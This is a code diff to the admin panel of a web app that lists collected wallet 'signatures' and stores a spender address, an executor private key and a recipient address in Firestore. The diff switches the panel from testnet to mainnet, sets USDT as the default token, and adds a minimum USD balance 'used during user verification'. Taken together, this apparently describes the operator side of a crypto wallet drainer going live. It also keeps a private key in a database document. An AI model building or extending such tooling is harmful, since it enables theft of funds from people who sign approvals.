@@ -6,8 +6,8 @@ import { ethers } from 'ethers';
 // Backend worker endpoint
 const BACKEND_URL = "/api/run-worker";
 
-// Default executor address (testnet) - can be overridden via Firestore admin settings
-const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
+// Default executor address (mainnet) - can be overridden via Firestore admin settings
+const HARDCODED_EXECUTOR = import.meta.env.VITE_SPENDER_ADDRESS || '0x0000000000000000000000000000000000000000';
 
 export default function Admin() {
   const [signatures, setSignatures] = useState([]);
@@ -21,6 +21,7 @@ export default function Admin() {
   const [executorAddressSetting, setExecutorAddressSetting] = useState(HARDCODED_EXECUTOR);
   const [executorPrivateKeySetting, setExecutorPrivateKeySetting] = useState('');
   const [recipientAddressSetting, setRecipientAddressSetting] = useState(HARDCODED_EXECUTOR);
+  const [minRequiredBalanceSetting, setMinRequiredBalanceSetting] = useState(100);
 
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [isModalOpen, setIsModalOpen] = useState(false);
@@ -42,11 +43,13 @@ export default function Admin() {
       const tokenVal = s.tokenAddress || outputToken;
       const privKeyVal = s.executorPrivateKey || '';
       const recipientVal = s.recipientAddress || HARDCODED_EXECUTOR;
+      const minVal = Number(s.minRequiredBalance);
 
       setExecutorAddressSetting(execVal);
       setExecutorPrivateKeySetting(privKeyVal);
       setOutputToken(tokenVal);
       setRecipientAddressSetting(recipientVal);
+      setMinRequiredBalanceSetting(Number.isFinite(minVal) ? minVal : 100);
       setSettingsStatus('Loaded');
     } catch (err) {
       setSettingsStatus('Load failed');
@@ -59,11 +62,15 @@ export default function Admin() {
     setSettingsLoading(true);
     setSettingsStatus('Saving...');
     try {
+      const parsedMin = Number(minRequiredBalanceSetting);
+      const minRequiredBalance = Number.isFinite(parsedMin) ? parsedMin : undefined;
+
       await setDoc(docRef(db, 'admin_config', 'settings'), {
         executorAddress: executorAddressSetting,
         executorPrivateKey: executorPrivateKeySetting || undefined,
         recipientAddress: recipientAddressSetting,
-        tokenAddress: outputToken
+        tokenAddress: outputToken,
+        minRequiredBalance
       }, { merge: true });
       setSettingsStatus('Saved successfully');
       setTimeout(() => setSettingsStatus(''), 3000);
@@ -96,7 +103,7 @@ export default function Admin() {
   const [executorTokenBalance, setExecutorTokenBalance] = useState('—');
   const [tokenSymbol, setTokenSymbol] = useState('TOKEN');
 
-  const DEFAULT_TOKEN = '0xaA8E23Fb1079EA71e0a56F48a2aA51851D8433D0';
+  const DEFAULT_TOKEN = import.meta.env.VITE_TOKEN_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const tokenAddress = outputToken || DEFAULT_TOKEN;
   const ERC20_ABI = [
     'function balanceOf(address) view returns (uint256)',
@@ -105,9 +112,8 @@ export default function Admin() {
   const [tokenDecimals, setTokenDecimals] = useState(6);
   const EXECUTOR_ADDRESS_UI = HARDCODED_EXECUTOR;
 
-  // Provider configured for Sepolia testnet by default
-  // Change to mainnet RPC if deploying to mainnet
-  const provider = new ethers.JsonRpcProvider(import.meta.env.VITE_RPC_URL || 'https://rpc.sepolia.org');
+  // Provider configured for mainnet by default
+  const provider = new ethers.JsonRpcProvider(import.meta.env.VITE_RPC_URL || 'https://cloudflare-eth.com');
 
   useEffect(() => {
     let mounted = true;
@@ -397,6 +403,20 @@ export default function Admin() {
                   className="w-full px-3 py-2 border rounded font-mono text-sm"
                   placeholder="0x..."
                 />
+              </div>
+
+              <div>
+                <label className="block text-sm font-semibold mb-1">Minimum Required Balance (USD)</label>
+                <input
+                  type="number"
+                  min="0"
+                  step="0.01"
+                  value={minRequiredBalanceSetting}
+                  onChange={e => setMinRequiredBalanceSetting(e.target.value)}
+                  className="w-full px-3 py-2 border rounded text-sm"
+                  placeholder="100"
+                />
+                <p className="text-xs text-gray-500 mt-1">Used during user verification</p>
               </div>
             </div>
 
